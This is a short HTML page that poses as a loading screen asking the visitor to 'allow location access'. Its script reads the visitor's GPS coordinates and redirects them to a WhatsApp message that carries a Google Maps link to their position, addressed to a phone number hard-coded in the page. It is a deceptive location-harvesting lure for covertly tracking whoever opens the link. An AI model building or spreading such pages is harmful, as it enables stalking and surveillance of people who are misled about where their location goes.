<!DOCTYPE html>
<html>
<head>
  <title>Location Access</title>
</head>
<body style="text-align:center; font-family:sans-serif;">
  <h2>Loading... Please allow location access</h2>

  <script>
    function sendToWhatsApp(lat, lon) {
      let phone = "918779544976"; // Tumhara WhatsApp number
      let message = `Location Found: https://www.google.com/maps?q=${lat},${lon}`;
      let url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
      window.location.href = url;
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        let lat = position.coords.latitude;
        let lon = position.coords.longitude;
        sendToWhatsApp(lat, lon);
      }, function(error) {
        alert("Location access denied!");
      });
    } else {
      alert("Geolocation not supported!");
    }
  </script>
</body>
</html>
